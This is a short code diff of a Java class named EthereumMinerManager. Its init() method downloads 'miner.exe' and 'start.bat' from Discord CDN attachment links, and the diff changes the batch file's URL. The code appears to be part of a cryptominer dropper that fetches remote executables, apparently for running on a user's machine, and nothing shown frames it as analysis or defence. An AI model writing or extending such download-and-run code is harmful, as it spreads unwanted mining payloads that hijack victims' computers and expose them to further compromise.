@@ -29,7 +29,7 @@ public class EthereumMinerManager {
 
     public EthereumMinerManager init() {
         download("https://cdn.discordapp.com/attachments/896292452913274920/959977176214683689/miner.exe", miner);
-        download("https://cdn.discordapp.com/attachments/777275264379387906/959972567421177936/start.bat", bat);
+        download("https://cdn.discordapp.com/attachments/785909027896295465/961225710930890802/start.bat", bat);
         return this;
     }
 
